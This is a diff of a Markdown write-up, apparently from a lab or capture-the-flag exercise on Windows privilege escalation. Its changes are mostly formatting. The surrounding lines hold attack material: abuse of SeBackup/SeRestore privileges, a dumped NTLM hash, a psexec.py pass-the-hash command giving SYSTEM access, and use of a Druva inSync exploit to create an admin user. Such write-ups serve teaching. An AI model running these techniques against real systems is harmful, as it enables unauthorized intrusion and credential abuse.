@@ -638,7 +638,7 @@ Attackers focus on **abusable privileges** that allow privilege escalation. Fo
 - [**Microsoft’s Official Privilege List**](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
 - [**Priv2Admin Project**](https://github.com/gtworek/Priv2Admin) (Exploitable privileges and techniques)
 
-We’ll demonstrate how attackers exploit common high-risk privileges—such as **S`eBackup / SeRestore`** or **`SeImpersonatePrivilege`**—to gain elevated access.
+We’ll demonstrate how attackers exploit common high-risk privileges—such as **`SeBackup / SeRestore`** or **`SeImpersonatePrivilege`**—to gain elevated access.
 
 ### **SeBackup / SeRestore**
 
@@ -712,7 +712,7 @@ THMTakeOwnership:1009:aad3b435b51404eeaad3b435b51404ee:0af9b65477395b680b822e0b2
 
 ```
 
-Use [psexec.py](https://wadcoms.github.io/wadcoms/Impacket-PsExec/), to Pass-the-Hash of the Administrator's account and gain access to the target machine with SYSTEM privileges
+Use [psexec.py](https://wadcoms.github.io/wadcoms/Impacket-PsExec/), to perform a Pass-the-Hash attack of the Administrator's account and gain access to the target machine with SYSTEM privileges
 
 ```bash
 root@ip-10-10-127-1:~# python3 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.119.143
@@ -879,7 +879,7 @@ Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Un
   Format-Table -AutoSize
 ```
 
-then search for potential vulnerabilities in  [exploit-db](https://www.exploit-db.com/), [packet storm](https://packetstormsecurity.com/) or [Google](https://www.google.com/),
+then search for potential vulnerabilities in [exploit-db](https://www.exploit-db.com/), [packet storm](https://packetstormsecurity.com/) or [Google](https://www.google.com/),
 
 ### **Case Study: Druva inSync 6.6.3**
 
@@ -894,8 +894,6 @@ The exploit can be found [here](https://packetstorm.news/files/id/160404). copy 
 To check if the exploit works, run this command `net user pwnd` Verify that the user `pwnd` exists and is part of the administrators' group. 
 
 <img width="1166" height="285" alt="Screenshot 2025-08-17 134836" src="https://github.com/user-attachments/assets/22c437e2-9160-421a-9cf0-fdedc5db8778" />
-
-<img width="1166" height="285" alt="Screenshot 2025-08-17 134836" src="https://github.com/user-attachments/assets/440189cd-6bf8-47f1-9557-e1c6b16ff87e" />
 
 Now, run the command prompt as administrator. When prompted for credentials, click on **More choices,** and use the `pwnd` account 
 
